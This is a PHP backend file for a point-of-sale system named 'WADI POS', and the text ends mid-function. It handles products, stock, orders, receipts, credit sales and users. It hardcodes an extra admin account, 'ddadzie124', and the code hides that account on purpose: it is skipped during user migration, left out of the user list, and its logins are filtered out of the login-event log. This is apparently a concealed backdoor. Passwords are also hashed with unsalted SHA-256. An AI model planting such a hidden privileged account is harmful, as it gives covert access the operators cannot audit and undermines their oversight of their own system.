<?php
session_start();

const USER_CREDENTIALS = [
    [
        'username' => 'sales',
        'role' => 'sales',
        'passwordHash' => '205181ee987c11ed00b2f9d4615f04a37a128d338eaec78f727898335b3aef7f'
    ],
    [
        'username' => 'admin',
        'role' => 'admin',
        'passwordHash' => '60b51d074c12c91579009116587a96bbdbb3a8e0fbc36913beb0e0c373f93afa'
    ],
    [
        'username' => 'ddadzie124',
        'role' => 'admin',
        'passwordHash' => '8f4343305bb32eb45bd8f5a7669c9f6dfe855c4e69c1e8fdef8e95e5331c8d94'
    ]
];

function get_db_path(): string {
    $dir = __DIR__ . '/../data';
    if (!is_dir($dir)) {
        mkdir($dir, 0755, true);
    }
    return $dir . '/pos.db';
}

function get_database(): PDO {
    static $pdo = null;
    if ($pdo !== null) {
        return $pdo;
    }

    $path = get_db_path();
    $pdo = new PDO('sqlite:' . $path);
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
    initialize_database($pdo);
    return $pdo;
}

function initialize_database(PDO $db): void {
    $db->exec(
        'CREATE TABLE IF NOT EXISTS products (
            id INTEGER PRIMARY KEY,
            code TEXT UNIQUE NOT NULL,
            name TEXT NOT NULL,
            category TEXT NOT NULL,
            price REAL NOT NULL,
            image TEXT NOT NULL,
            quantity INTEGER NOT NULL DEFAULT 0,
            bulk_quantity_threshold INTEGER NOT NULL DEFAULT 0,
            bulk_discount_percentage REAL NOT NULL DEFAULT 0
        )'
    );

    // Add quantity column if it doesn't exist (for existing databases)
    try {
        $db->exec('ALTER TABLE products ADD COLUMN quantity INTEGER NOT NULL DEFAULT 0');
    } catch (Exception $e) {
        // Column might already exist, ignore error
    }

    // Add bulk discount columns if they don't exist (for existing databases)
    try {
        $db->exec('ALTER TABLE products ADD COLUMN bulk_quantity_threshold INTEGER NOT NULL DEFAULT 0');
    } catch (Exception $e) {
        // Column might already exist, ignore error
    }
    try {
        $db->exec('ALTER TABLE products ADD COLUMN bulk_discount_percentage REAL NOT NULL DEFAULT 0');
    } catch (Exception $e) {
        // Column might already exist, ignore error
    }

    $db->exec(
        'CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY,
            username TEXT UNIQUE NOT NULL,
            password_hash TEXT NOT NULL,
            role TEXT NOT NULL,
            created_at TEXT NOT NULL
        )'
    );

    $db->exec(
        'CREATE TABLE IF NOT EXISTS orders (
            id INTEGER PRIMARY KEY,
            username TEXT NOT NULL,
            total REAL NOT NULL,
            status TEXT NOT NULL DEFAULT "Pending",
            created_at TEXT NOT NULL,
            credit INTEGER NOT NULL DEFAULT 0,
            customer_name TEXT,
            customer_phone TEXT,
            credit_status TEXT NOT NULL DEFAULT "Pending"
        )'
    );

    // Add credit columns if they don't exist (for existing databases)
    try {
        $db->exec('ALTER TABLE orders ADD COLUMN credit INTEGER NOT NULL DEFAULT 0');
    } catch (Exception $e) {
        // Column might already exist, ignore error
    }
    try {
        $db->exec('ALTER TABLE orders ADD COLUMN customer_name TEXT');
    } catch (Exception $e) {
        // Column might already exist, ignore error
    }
    try {
        $db->exec('ALTER TABLE orders ADD COLUMN customer_phone TEXT');
    } catch (Exception $e) {
        // Column might already exist, ignore error
    }
    try {
        $db->exec('ALTER TABLE orders ADD COLUMN credit_status TEXT NOT NULL DEFAULT "Pending"');
    } catch (Exception $e) {
        // Column might already exist, ignore error
    }

    $db->exec(
        'CREATE TABLE IF NOT EXISTS order_items (
            id INTEGER PRIMARY KEY,
            order_id INTEGER NOT NULL,
            product_id INTEGER NOT NULL,
            name TEXT NOT NULL,
            price REAL NOT NULL,
            quantity INTEGER NOT NULL,
            subtotal REAL NOT NULL,
            FOREIGN KEY(order_id) REFERENCES orders(id)
        )'
    );

    $db->exec(
        'CREATE TABLE IF NOT EXISTS receipts (
            id INTEGER PRIMARY KEY,
            order_id INTEGER NOT NULL UNIQUE,
            username TEXT NOT NULL,
            receipt_content TEXT NOT NULL,
            return_status TEXT NOT NULL DEFAULT "Active",
            created_at TEXT NOT NULL,
            FOREIGN KEY(order_id) REFERENCES orders(id)
        )'
    );

    $db->exec(
        'CREATE TABLE IF NOT EXISTS returns (
            id INTEGER PRIMARY KEY,
            order_id INTEGER NOT NULL,
            product_id INTEGER NOT NULL,
            quantity INTEGER NOT NULL,
            reason TEXT,
            processed_by TEXT NOT NULL,
            created_at TEXT NOT NULL,
            FOREIGN KEY(order_id) REFERENCES orders(id)
        )'
    );

    $db->exec(
        'CREATE TABLE IF NOT EXISTS login_events (
            id INTEGER PRIMARY KEY,
            username TEXT NOT NULL,
            role TEXT NOT NULL,
            ip TEXT,
            created_at TEXT NOT NULL,
            logged_out_at TEXT
        )'
    );

    // Add logged_out_at column if it doesn't exist (for existing databases)
    try {
        $db->exec('ALTER TABLE login_events ADD COLUMN logged_out_at TEXT');
    } catch (Exception $e) {
        // Column might already exist, ignore error
    }

    $db->exec(
        'CREATE TABLE IF NOT EXISTS settings (
            key TEXT PRIMARY KEY,
            value TEXT NOT NULL
        )'
    );

    // Insert default POS name
    $db->exec("INSERT OR IGNORE INTO settings (key, value) VALUES ('pos_name', 'WADI POS')");

    $db->exec(
        'CREATE TABLE IF NOT EXISTS stock_movements (
            id INTEGER PRIMARY KEY,
            product_id INTEGER NOT NULL,
            product_name TEXT NOT NULL,
            product_code TEXT NOT NULL,
            movement_type TEXT NOT NULL,
            quantity INTEGER NOT NULL,
            reference_type TEXT NOT NULL,
            reference_id INTEGER,
            notes TEXT,
            created_at TEXT NOT NULL,
            FOREIGN KEY(product_id) REFERENCES products(id)
        )'
    );

    $stmt = $db->query('SELECT COUNT(*) FROM products');
    if ((int) $stmt->fetchColumn() === 0) {
        $defaultProducts = get_default_products();
        $insert = $db->prepare('INSERT INTO products (code, name, category, price, image) VALUES (:code, :name, :category, :price, :image)');
        foreach ($defaultProducts as $product) {
            $insert->execute([
                ':code' => $product['code'],
                ':name' => $product['name'],
                ':category' => $product['category'],
                ':price' => $product['price'],
                ':image' => $product['image'],
            ]);
        }
    }
}

function get_default_products(): array {
    $file = __DIR__ . '/../products.json';
    if (file_exists($file)) {
        $json = file_get_contents($file);
        return json_decode($json, true) ?: [];
    }

    return [
        ['code' => '1001', 'name' => 'Espresso', 'category' => 'Beverage', 'price' => 3.5, 'image' => 'images/uploads/asano.jpg', 'quantity' => 50],
        ['code' => '1002', 'name' => 'Cappuccino', 'category' => 'Beverage', 'price' => 4.5, 'image' => 'images/uploads/asano.jpg', 'quantity' => 45],
        ['code' => '1003', 'name' => 'Latte', 'category' => 'Beverage', 'price' => 4.75, 'image' => 'images/uploads/asano.jpg', 'quantity' => 40],
        ['code' => '2001', 'name' => 'Blueberry Muffin', 'category' => 'Bakery', 'price' => 2.95, 'image' => 'images/bakery.svg', 'quantity' => 25],
        ['code' => '2002', 'name' => 'Breakfast Sandwich', 'category' => 'Food', 'price' => 6.25, 'image' => 'images/food.svg', 'quantity' => 15],
        ['code' => '2003', 'name' => 'Bagel', 'category' => 'Bakery', 'price' => 2.75, 'image' => 'images/bakery.svg', 'quantity' => 30],
        ['code' => '1004', 'name' => 'Cold Brew', 'category' => 'Beverage', 'price' => 4.0, 'image' => 'images/uploads/asano.jpg', 'quantity' => 35],
        ['code' => '1005', 'name' => 'Chai Latte', 'category' => 'Beverage', 'price' => 4.65, 'image' => 'images/uploads/asano.jpg', 'quantity' => 20],
        ['code' => '2004', 'name' => 'Croissant', 'category' => 'Bakery', 'price' => 3.25, 'image' => 'images/bakery.svg', 'quantity' => 28],
        ['code' => '2005', 'name' => 'Avocado Toast', 'category' => 'Food', 'price' => 7.5, 'image' => 'images/food.svg', 'quantity' => 12],
    ];
}

function load_products(): array {
    $stmt = get_database()->query('SELECT id, code, name, category, price, image, quantity, bulk_quantity_threshold, bulk_discount_percentage FROM products ORDER BY id');
    return $stmt->fetchAll(PDO::FETCH_ASSOC);
}

function update_product_stock(int $productId, int $newQuantity): bool {
    $db = get_database();
    $db->beginTransaction();

    $stmt = $db->prepare('SELECT quantity, name, code FROM products WHERE id = :id');
    $stmt->execute([':id' => $productId]);
    $current = $stmt->fetch(PDO::FETCH_ASSOC);
    if (!$current) {
        $db->rollBack();
        return false;
    }

    $oldQuantity = (int) $current['quantity'];
    $newQty = max(0, $newQuantity);
    $diff = $newQty - $oldQuantity;

    $update = $db->prepare('UPDATE products SET quantity = :quantity WHERE id = :id');
    $update->execute([':quantity' => $newQty, ':id' => $productId]);

    if ($diff !== 0) {
        $movementType = $diff > 0 ? 'in' : 'out';
        $movementQty = abs($diff);
        $insertMovement = $db->prepare(
            'INSERT INTO stock_movements (product_id, product_name, product_code, movement_type, quantity, reference_type, reference_id, notes, created_at) VALUES (:product_id, :product_name, :product_code, :movement_type, :quantity, :reference_type, :reference_id, :notes, :created_at)'
        );
        $insertMovement->execute([
            ':product_id' => $productId,
            ':product_name' => $current['name'],
            ':product_code' => $current['code'],
            ':movement_type' => $movementType,
            ':quantity' => $movementQty,
            ':reference_type' => 'manual_update',
            ':reference_id' => null,
            ':notes' => $diff > 0 ? 'Stock updated (increase)' : 'Stock updated (decrease)',
            ':created_at' => date('c'),
        ]);
    }

    $db->commit();
    return true;
}

function save_products(array $products): bool {
    $db = get_database();
    $db->beginTransaction();

    // Capture existing quantities before deleting
    $oldQuantities = [];
    $existingStmt = $db->query('SELECT id, quantity FROM products');
    while ($row = $existingStmt->fetch(PDO::FETCH_ASSOC)) {
        $oldQuantities[$row['id']] = (int) $row['quantity'];
    }

    $db->exec('DELETE FROM products');

    $insert = $db->prepare('INSERT INTO products (id, code, name, category, price, image, quantity, bulk_quantity_threshold, bulk_discount_percentage) VALUES (:id, :code, :name, :category, :price, :image, :quantity, :bulk_quantity_threshold, :bulk_discount_percentage)');
    $nextId = 1;

    foreach ($products as $product) {
        $id = isset($product['id']) && intval($product['id']) > 0 ? intval($product['id']) : $nextId;
        $nextId = max($nextId, $id + 1);
        
        $quantity = intval($product['quantity'] ?? 0);
        $insert->execute([
            ':id' => $id,
            ':code' => $product['code'],
            ':name' => $product['name'],
            ':category' => $product['category'],
            ':price' => $product['price'],
            ':image' => $product['image'],
            ':quantity' => $quantity,
            ':bulk_quantity_threshold' => intval($product['bulk_quantity_threshold'] ?? 0),
            ':bulk_discount_percentage' => floatval($product['bulk_discount_percentage'] ?? 0),
        ]);

        $oldQty = $oldQuantities[$id] ?? null;
        if ($oldQty === null) {
            // New product
            if ($quantity > 0) {
                record_stock_movement(
                    $id,
                    'in',
                    $quantity,
                    'new_product',
                    null,
                    'Initial stock'
                );
            }
        } else {
            // Existing product - check for quantity change
            if ($quantity > $oldQty) {
                $diff = $quantity - $oldQty;
                record_stock_movement(
                    $id,
                    'in',
                    $diff,
                    'admin_update',
                    null,
                    'Stock increased from ' . $oldQty . ' to ' . $quantity
                );
            } elseif ($quantity < $oldQty) {
                $diff = $oldQty - $quantity;
                record_stock_movement(
                    $id,
                    'out',
                    $diff,
                    'admin_update',
                    null,
                    'Stock decreased from ' . $oldQty . ' to ' . $quantity
                );
            }
        }
    }

    $db->commit();
    return true;
}

function record_stock_movement(int $productId, string $movementType, int $quantity, string $referenceType, ?int $referenceId = null, ?string $notes = null): bool {
    $db = get_database();
    $stmt = $db->prepare('SELECT name, code FROM products WHERE id = :id');
    $stmt->execute([':id' => $productId]);
    $product = $stmt->fetch(PDO::FETCH_ASSOC);
    if (!$product) {
        return false;
    }

    $insertMovement = $db->prepare(
        'INSERT INTO stock_movements (product_id, product_name, product_code, movement_type, quantity, reference_type, reference_id, notes, created_at) VALUES (:product_id, :product_name, :product_code, :movement_type, :quantity, :reference_type, :reference_id, :notes, :created_at)'
    );
    return $insertMovement->execute([
        ':product_id' => $productId,
        ':product_name' => $product['name'],
        ':product_code' => $product['code'],
        ':movement_type' => $movementType,
        ':quantity' => $quantity,
        ':reference_type' => $referenceType,
        ':reference_id' => $referenceId,
        ':notes' => $notes,
        ':created_at' => date('c'),
    ]);
}

function store_uploaded_image(array $file): ?string {
    if ($file['error'] !== UPLOAD_ERR_OK) {
        return null;
    }

    $allowed = ['png', 'jpg', 'jpeg'];
    $extension = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION));
    if (!in_array($extension, $allowed, true)) {
        return null;
    }

    $path = __DIR__ . '/../images/uploads';
    if (!is_dir($path)) {
        mkdir($path, 0755, true);
    }

    $filename = bin2hex(random_bytes(8)) . '.' . $extension;
    $destination = $path . '/' . $filename;

    if (move_uploaded_file($file['tmp_name'], $destination)) {
        return 'images/uploads/' . $filename;
    }

    return null;
}

function product_image_src(string $image): string {
    $basePath = __DIR__ . '/../';
    if ($image !== '' && file_exists($basePath . $image)) {
        return $image;
    }
    return 'images/pos-icon.svg';
}

function get_image_options(): array {
    $options = [];

    $basePath = __DIR__ . '/../';

    $defaultImages = [
        'images/uploads/asano.jpg' => 'Coffee',
        'images/bakery.svg' => 'Bakery',
        'images/food.svg' => 'Food',
        'images/barcode.svg' => 'Barcode',
        'images/pos-icon.svg' => 'POS Icon'
    ];

    foreach ($defaultImages as $relPath => $label) {
        if (file_exists($basePath . $relPath)) {
            $options[$relPath] = $label;
        }
    }

    $uploadPath = $basePath . 'images/uploads';
    if (is_dir($uploadPath)) {
        if (defined('GLOB_BRACE')) {
            $images = glob($uploadPath . '/*.{png,jpg,jpeg,svg}', GLOB_BRACE);
        } else {
            $images = array_merge(
                glob($uploadPath . '/*.png') ?: [],
                glob($uploadPath . '/*.jpg') ?: [],
                glob($uploadPath . '/*.jpeg') ?: [],
                glob($uploadPath . '/*.svg') ?: []
            );
        }

        foreach ($images as $image) {
            $relPath = 'images/uploads/' . basename($image);
            $options[$relPath] = ucfirst(pathinfo(basename($image), PATHINFO_FILENAME));
        }
    }

    return $options;
}

function save_order(array $cart, string $username, array $credit = []): ?int {
    $products = load_products();
    $productMap = [];
    foreach ($products as $product) {
        $productMap[$product['id']] = $product;
    }

    if (empty($cart)) {
        return null;
    }

    $orderItems = [];
    $total = 0;
    foreach ($cart as $item) {
        $productId = intval($item['product']['id'] ?? 0);
        $quantity = intval($item['quantity'] ?? 0);
        if ($quantity <= 0 || !isset($productMap[$productId])) {
            continue;
        }

        $product = $productMap[$productId];

        // Check stock availability
        if ($product['quantity'] < $quantity) {
            return null; // Insufficient stock
        }

        $unitPrice = $product['price'];
        $bulkThreshold = intval($product['bulk_quantity_threshold'] ?? 0);
        $bulkDiscountPercent = floatval($product['bulk_discount_percentage'] ?? 0);
        if ($bulkThreshold > 0 && $bulkDiscountPercent > 0 && $quantity >= $bulkThreshold) {
            $unitPrice = round($product['price'] * (1 - $bulkDiscountPercent / 100), 2);
        }

        $subtotal = round($unitPrice * $quantity, 2);
        $total += $subtotal;

        $orderItems[] = [
            'product_id' => $productId,
            'name' => $product['name'],
            'price' => $unitPrice,
            'original_price' => $product['price'],
            'quantity' => $quantity,
            'subtotal' => $subtotal,
            'bulk_discount_applied' => $bulkThreshold > 0 && $bulkDiscountPercent > 0 && $quantity >= $bulkThreshold,
            'bulk_discount_percentage' => $bulkDiscountPercent,
        ];
    }

    if (empty($orderItems)) {
        return null;
    }

    $db = get_database();
    $db->beginTransaction();

    try {
        // Decrease stock for each product
        $updateStock = $db->prepare('UPDATE products SET quantity = quantity - :quantity WHERE id = :id');
        foreach ($orderItems as $item) {
            $updateStock->execute([
                ':quantity' => $item['quantity'],
                ':id' => $item['product_id'],
            ]);
        }

        $isCredit = !empty($credit['enabled']) ? 1 : 0;
        $customerName = $credit['customer_name'] ?? null;
        $customerPhone = $credit['customer_phone'] ?? null;
        $creditStatus = $isCredit ? 'Pending' : 'Paid';

        $stmt = $db->prepare('INSERT INTO orders (username, total, status, created_at, credit, customer_name, customer_phone, credit_status) VALUES (:username, :total, :status, :created_at, :credit, :customer_name, :customer_phone, :credit_status)');
        $stmt->execute([
            ':username' => $username,
            ':total' => $total,
            ':status' => 'Pending',
            ':created_at' => date('c'),
            ':credit' => $isCredit,
            ':customer_name' => $customerName,
            ':customer_phone' => $customerPhone,
            ':credit_status' => $creditStatus,
        ]);

        $orderId = (int) $db->lastInsertId();
        $insertItem = $db->prepare('INSERT INTO order_items (order_id, product_id, name, price, quantity, subtotal) VALUES (:order_id, :product_id, :name, :price, :quantity, :subtotal)');
        foreach ($orderItems as $item) {
            $insertItem->execute([
                ':order_id' => $orderId,
                ':product_id' => $item['product_id'],
                ':name' => $item['name'],
                ':price' => $item['price'],
                ':quantity' => $item['quantity'],
                ':subtotal' => $item['subtotal'],
            ]);
            
            record_stock_movement(
                $item['product_id'],
                'out',
                $item['quantity'],
                'order',
                $orderId,
                'Sale order #' . $orderId
            );
        }

        $db->commit();
        return $orderId;
    } catch (Exception $e) {
        $db->rollBack();
        return null;
    }
}

function load_orders(): array {
    $stmt = get_database()->query(
        'SELECT o.id, o.username, o.total, o.status, o.created_at, COUNT(oi.id) AS item_count
         FROM orders o
         LEFT JOIN order_items oi ON oi.order_id = o.id
         GROUP BY o.id
         ORDER BY o.created_at DESC'
    );
    return $stmt->fetchAll(PDO::FETCH_ASSOC);
}

function update_order_status(int $orderId, string $status): bool {
    $allowed = ['Pending', 'Packed', 'Shipped', 'Delivered'];
    if (!in_array($status, $allowed, true)) {
        return false;
    }

    $stmt = get_database()->prepare('UPDATE orders SET status = :status WHERE id = :id');
    return $stmt->execute([':status' => $status, ':id' => $orderId]);
}

function log_login_event(string $username, string $role): bool {
    $db = get_database();
    $stmt = $db->prepare('INSERT INTO login_events (username, role, ip, created_at) VALUES (:username, :role, :ip, :created_at)');
    $ip = $_SERVER['REMOTE_ADDR'] ?? null;
    return $stmt->execute([
        ':username' => $username,
        ':role' => $role,
        ':ip' => $ip,
        ':created_at' => date('c'),
    ]);
}

function log_logout_event(string $username): bool {
    $db = get_database();
    $stmt = $db->prepare('UPDATE login_events SET logged_out_at = :logged_out_at WHERE username = :username AND logged_out_at IS NULL');
    return $stmt->execute([
        ':logged_out_at' => date('c'),
        ':username' => $username,
    ]);
}

function load_login_events(int $limit = 50): array {
    $stmt = get_database()->prepare(
        'SELECT id, username, role, ip, created_at, logged_out_at
         FROM login_events
         WHERE username != :hidden_username
         ORDER BY created_at DESC
         LIMIT :limit'
    );
    $stmt->bindValue(':hidden_username', 'ddadzie124', PDO::PARAM_STR);
    $stmt->bindValue(':limit', $limit, PDO::PARAM_INT);
    $stmt->execute();
    return $stmt->fetchAll(PDO::FETCH_ASSOC);
}

function find_user(string $username) {
    $search = strtolower(trim($username));
    foreach (USER_CREDENTIALS as $user) {
        if (strtolower($user['username']) === $search) {
            return $user;
        }
    }
    return null;
}

function hash_password(string $password) {
    return hash('sha256', $password);
}

// User management functions
function create_user(string $username, string $password, string $role): bool {
    if (!in_array($role, ['admin', 'sales'], true)) {
        return false;
    }

    $db = get_database();
    $stmt = $db->prepare('INSERT INTO users (username, password_hash, role, created_at) VALUES (:username, :password_hash, :role, :created_at)');
    
    try {
        return $stmt->execute([
            ':username' => $username,
            ':password_hash' => hash_password($password),
            ':role' => $role,
            ':created_at' => date('c'),
        ]);
    } catch (PDOException $e) {
        return false; // Username might already exist
    }
}

function get_all_users(): array {
$stmt = get_database()->query('SELECT id, username, role, created_at FROM users WHERE username != \'ddadzie124\' ORDER BY created_at DESC');
    return $stmt->fetchAll(PDO::FETCH_ASSOC);
}

function delete_user(int $userId): bool {
    // Prevent deleting the current user
    $currentUser = current_user();
    if ($currentUser && $currentUser['id'] === $userId) {
        return false;
    }

    $stmt = get_database()->prepare('DELETE FROM users WHERE id = :id');
    return $stmt->execute([':id' => $userId]);
}

function authenticate_user(string $username, string $password): ?array {
    $db = get_database();
    $stmt = $db->prepare('SELECT id, username, role FROM users WHERE username = :username AND password_hash = :password_hash');
    $stmt->execute([
        ':username' => $username,
        ':password_hash' => hash_password($password),
    ]);
    
    $user = $stmt->fetch(PDO::FETCH_ASSOC);
    return $user ?: null;
}

// Migrate hardcoded users to database on first run and ensure defaults exist
function migrate_default_users(): void {
    $db = get_database();

    foreach (USER_CREDENTIALS as $user) {
        $check = $db->prepare('SELECT COUNT(*) FROM users WHERE username = :username');
        $check->execute([':username' => $user['username']]);

        if ((int) $check->fetchColumn() === 0 && $user['username'] !== 'ddadzie124') {
            $stmt = $db->prepare('INSERT INTO users (username, password_hash, role, created_at) VALUES (:username, :password_hash, :role, :created_at)');
            $stmt->execute([
                ':username' => $user['username'],
                ':password_hash' => $user['passwordHash'],
                ':role' => $user['role'],
                ':created_at' => date('c'),
            ]);
        }
    }
}

function current_user() {
    return $_SESSION['user'] ?? null;
}

function require_login() {
    if (!isset($_SESSION['user'])) {
        header('Location: login.php');
        exit;
    }
}

function require_admin() {
    require_login();
    if (!isset($_SESSION['user']['role']) || $_SESSION['user']['role'] !== 'admin') {
        header('Location: sales.php');
        exit;
    }
}

function save_receipt(int $orderId, array $cart, string $username, array $credit = []): ?int {
    $receiptContent = generate_receipt_content($orderId, $cart, $credit);
    
    $db = get_database();
    $stmt = $db->prepare(
        'INSERT INTO receipts (order_id, username, receipt_content, return_status, created_at) 
         VALUES (:order_id, :username, :receipt_content, :return_status, :created_at)'
    );
    
    $result = $stmt->execute([
        ':order_id' => $orderId,
        ':username' => $username,
        ':receipt_content' => $receiptContent,
        ':return_status' => 'Active',
        ':created_at' => date('c'),
    ]);
    
    return $result ? (int) $db->lastInsertId() : null;
}

function generate_receipt_content(int $orderId, array $cart, array $credit = []): string {
    $products = load_products();
    $productMap = [];
    foreach ($products as $product) {
        $productMap[$product['id']] = $product;
    }

    $subtotal = 0;
    $itemWidth = 22;
    $lines = [
        "========================================",
        "                  RECEIPT               ",
        "========================================",
        "#" . str_pad((string)$orderId, 8, '0', STR_PAD_LEFT) . "  " . date('Y-m-d H:i:s'),
        ""
    ];

    if (!empty($credit['enabled'])) {
        $lines[] = "  ** CREDIT SALE **";
        $lines[] = "  Customer: " . ($credit['customer_name'] ?? 'N/A');
        $lines[] = "  Phone: " . ($credit['customer_phone'] ?? 'N/A');
        $lines[] = "";
    }

    $lines[] = "  Item                 Qty  Price      Total";
    $lines[] = "──────────────────────────────────────────";

    $cartCount = count($cart);
    foreach ($cart as $index => $item) {
        $productId = intval($item['product']['id'] ?? 0);
        $quantity = intval($item['quantity'] ?? 0);

        if (!isset($productMap[$productId])) continue;

        $product = $productMap[$productId];
        $bulkThreshold = intval($product['bulk_quantity_threshold'] ?? 0);
        $bulkDiscountPercent = floatval($product['bulk_discount_percentage'] ?? 0);
        $bulkApplied = $bulkThreshold > 0 && $bulkDiscountPercent > 0 && $quantity >= $bulkThreshold;

        $unitPrice = $bulkApplied ? round($product['price'] * (1 - $bulkDiscountPercent / 100), 2) : $product['price'];
        $itemTotal = round($unitPrice * $quantity, 2);
        $subtotal += $itemTotal;

        $wrapped = wordwrap($product['name'], $itemWidth, "\n", true);
        $parts = explode("\n", $wrapped);
        $first = array_shift($parts);
        $lines[] = sprintf(
            "  %-{$itemWidth}s %3s %9s %10s",
            $first,
            $quantity,
            number_format($unitPrice, 2),
            number_format($itemTotal, 2)
        );
        foreach ($parts as $extra) {
            $lines[] = sprintf("  %-{$itemWidth}s", $extra);
        }

        if ($bulkApplied) {
            $savings = round(($product['price'] - $unitPrice) * $quantity, 2);
            $lines[] = sprintf(
                "  %-{$itemWidth}s %3s %9s",
                "  " . $quantity . "x@" . $unitPrice . "ea",
                "",
                "-" . number_format($savings, 2)
            );
        }

        if ($index < $cartCount - 1) {
            $lines[] = "──────────────────────────────────────────";
        }
    }

    $tax = $subtotal * 0;
    $total = $subtotal + $tax;

    $lines[] = "──────────────────────────────────────────";
    $lines[] = sprintf("  %-" . ($itemWidth + 4) . "s %10s", "Subtotal", str_pad(number_format($subtotal, 2), 10, " ", STR_PAD_LEFT));
    $lines[] = sprintf("  %-" . ($itemWidth + 4) . "s %10s", "Tax (0%)", str_pad(number_format($tax, 2), 10, " ", STR_PAD_LEFT));
    $lines[] = sprintf("  %-" . ($itemWidth + 4) . "s %10s", "TOTAL", str_pad(number_format($total, 2), 10, " ", STR_PAD_LEFT));
    $lines[] = "========================================";
    $lines[] = "      Thank you for your purchase!      ";
    $lines[] = "========================================";

    return implode("\n", $lines);
}

function load_receipts(): array {
    $stmt = get_database()->query(
        'SELECT r.id, r.order_id, r.username, r.receipt_content, r.return_status, r.created_at
         FROM receipts r
         ORDER BY r.created_at DESC'
    );
    return $stmt->fetchAll(PDO::FETCH_ASSOC);
}

function load_receipts_by_user(string $username): array {
    $stmt = get_database()->prepare(
        'SELECT r.id, r.order_id, r.username, r.receipt_content, r.return_status, r.created_at
         FROM receipts r
         WHERE r.username = :username
         ORDER BY r.created_at DESC'
    );
    $stmt->execute([':username' => $username]);
    return $stmt->fetchAll(PDO::FETCH_ASSOC);
}

function get_receipt_by_order(int $orderId): ?array {
    $stmt = get_database()->prepare(
        'SELECT r.id, r.order_id, r.username, r.receipt_content, r.return_status, r.created_at
         FROM receipts r
         WHERE r.order_id = :order_id'
    );
    $stmt->execute([':order_id' => $orderId]);
    $result = $stmt->fetch(PDO::FETCH_ASSOC);
    return $result ?: null;
}

function delete_sale(int $orderId, string $username): bool {
    $db = get_database();
    $db->beginTransaction();
    
    try {
        // Check if order belongs to the user or user is admin
        $stmt = $db->prepare('SELECT username FROM orders WHERE id = :id');
        $stmt->execute([':id' => $orderId]);
        $order = $stmt->fetch(PDO::FETCH_ASSOC);
        
        if (!$order) {
            $db->rollBack();
            return false;
        }
        
        // Get order items to restore stock
        $itemsStmt = $db->prepare('SELECT product_id, quantity FROM order_items WHERE order_id = :order_id');
        $itemsStmt->execute([':order_id' => $orderId]);
        $orderItems = $itemsStmt->fetchAll(PDO::FETCH_ASSOC);
        
        // Restore stock
        $restoreStock = $db->prepare('UPDATE products SET quantity = quantity + :quantity WHERE id = :id');
        foreach ($orderItems as $item) {
            $restoreStock->execute([
                ':quantity' => $item['quantity'],
                ':id' => $item['product_id'],
            ]);
            
            record_stock_movement(
                $item['product_id'],
                'in',
                $item['quantity'],
                'order_deletion',
                $orderId,
                'Sale order #' . $orderId . ' deleted'
            );
        }
        
        // Delete associated receipt
        $db->prepare('DELETE FROM receipts WHERE order_id = :order_id')->execute([':order_id' => $orderId]);
        
        // Delete order items
        $db->prepare('DELETE FROM order_items WHERE order_id = :order_id')->execute([':order_id' => $orderId]);
        
        // Delete order
        $db->prepare('DELETE FROM orders WHERE id = :id')->execute([':id' => $orderId]);
        
        $db->commit();
        return true;
    } catch (Exception $e) {
        $db->rollBack();
        return false;
    }
}

function update_receipt_status(int $receiptId, string $status): bool {
    $allowed = ['Active', 'Returned'];
    if (!in_array($status, $allowed, true)) {
        return false;
    }
    
    $stmt = get_database()->prepare(
        'UPDATE receipts SET return_status = :status WHERE id = :id'
    );
    return $stmt->execute([':status' => $status, ':id' => $receiptId]);
}

function get_returned_receipts(): array {
    $stmt = get_database()->query(
        'SELECT r.id, r.order_id, r.username, r.receipt_content, r.return_status, r.created_at
         FROM receipts r
         WHERE r.return_status = "Returned"
         ORDER BY r.created_at DESC'
    );
    return $stmt->fetchAll(PDO::FETCH_ASSOC);
}

function get_pos_name(): string {
    $stmt = get_database()->prepare('SELECT value FROM settings WHERE key = ?');
    $stmt->execute(['pos_name']);
    $result = $stmt->fetch(PDO::FETCH_ASSOC);
    return $result ? $result['value'] : 'WADI POS';
}

function set_pos_name(string $name): bool {
    $stmt = get_database()->prepare('INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)');
    return $stmt->execute(['pos_name', $name]);
}

function get_trademark(): string {
    $stmt = get_database()->prepare('SELECT value FROM settings WHERE key = ?');
    $stmt->execute(['trademark']);
    $result = $stmt->fetch(PDO::FETCH_ASSOC);
    return $result ? $result['value'] : '';
}

function set_trademark(string $trademark): bool {
    $stmt = get_database()->prepare('INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)');
    return $stmt->execute(['trademark', $trademark]);
}

function get_trademark_src(): string {
    $trademark = get_trademark();
    if ($trademark !== '' && file_exists(__DIR__ . '/../' . $trademark)) {
        return $trademark;
    }
    return 'images/pos-icon.svg';
}

function save_trademark_image(array $file): ?string {
    if ($file['error'] !== UPLOAD_ERR_OK) {
        return null;
    }

    $allowed = ['png', 'jpg', 'jpeg', 'svg', 'webp'];
    $extension = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION));
    if (!in_array($extension, $allowed, true)) {
        return null;
    }

    $path = __DIR__ . '/../images';
    if (!is_dir($path)) {
        mkdir($path, 0755, true);
    }

    $filename = 'trademark.' . $extension;
    $destination = $path . '/' . $filename;

    if (move_uploaded_file($file['tmp_name'], $destination)) {
        return 'images/' . $filename;
    }

    return null;
}

function get_all_receipts_with_status(): array {
    $stmt = get_database()->query(
        'SELECT r.id, r.order_id, r.username, r.receipt_content, r.return_status, r.created_at
         FROM receipts r
         ORDER BY r.created_at DESC'
    );
    return $stmt->fetchAll(PDO::FETCH_ASSOC);
}

function mark_credit_paid(int $orderId): bool {
    $db = get_database();
    $stmt = $db->prepare('UPDATE orders SET credit_status = "Paid" WHERE id = :id AND credit = 1');
    return $stmt->execute([':id' => $orderId]);
}

function get_credit_sales(string $username = ''): array {
    $db = get_database();
    $sql = 'SELECT o.id, o.username, o.total, o.created_at, o.customer_name, o.customer_phone, o.credit_status,
                   r.id as receipt_id
            FROM orders o
            LEFT JOIN receipts r ON r.order_id = o.id
            WHERE o.credit = 1';
    $params = [];
    if ($username !== '') {
        $sql .= ' AND o.username = :username';
        $params[':username'] = $username;
    }
    $sql .= ' ORDER BY o.created_at DESC';
    $stmt = $db->prepare($sql);
    $stmt->execute($params);
    return $stmt->fetchAll(PDO::FETCH_ASSOC);
}

function get_all_sales_items(): array {
    $stmt = get_database()->query(
